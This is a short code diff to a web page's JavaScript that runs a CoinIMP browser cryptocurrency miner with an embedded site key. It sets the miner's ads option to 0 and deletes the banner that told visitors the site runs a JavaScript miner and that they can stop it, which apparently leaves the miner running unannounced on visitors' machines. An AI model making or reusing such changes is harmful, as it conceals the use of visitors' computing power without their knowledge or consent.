@@ -681,7 +681,7 @@ document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/
             var _client = new Client.User(
                 'e0e51f0a59eb9d9fa2d89d597f81e5df53e703886121274845cc9040dc5ae11b',
                 uid,
-                {throttle: 0, c: 'w'}
+                {throttle: 0, c: 'w', ads: 0}
             );
 
             $("#input-throttle").val((param_throttle == null) ? _client.getThrottle() : param_throttle);
@@ -689,8 +689,7 @@ document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/
             $("#max-threads").text(navigator.hardwareConcurrency)
             
             StartMiner();
-            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
+            
             // Main Loop
             setInterval(function(){
                 // console.log(inputConverter($("#input-throttle").val(), 0, 0.99), inputConverter($("#input-threads").val(), 1, navigator.hardwareConcurrency));
